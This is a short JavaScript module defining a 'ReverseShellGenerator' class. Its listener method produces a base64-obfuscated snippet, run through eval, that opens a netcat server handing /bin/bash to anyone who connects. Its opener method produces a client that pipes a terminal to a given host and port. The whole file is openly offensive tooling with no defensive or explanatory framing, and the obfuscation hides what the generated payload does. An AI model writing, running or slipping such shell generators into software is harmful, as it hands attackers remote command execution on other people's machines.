class ReverseShellGenerator {
    constructor({ host, port, command }) {
        this.host = host;
        this.port = port;
        this.command = command || '/bin/bash';
    }

    listener() {
        const code = Buffer.from(`const netcat = require('netcat')
const server = new netcat.server()
server.port(${this.port}).listen().exec('/bin/bash')`).toString('base64')

        return `eval(Buffer.from('${code}', 'base64').toString('ascii'))`
    }

    opener() {
        return `import netcat from 'netcat'
const client = new netcat.client()
process.stdin.pipe( client.addr('${this.host}').port(${this.port}).connect().pipe(process.stdout).stream())\n`
    }
}

export default ReverseShellGenerator
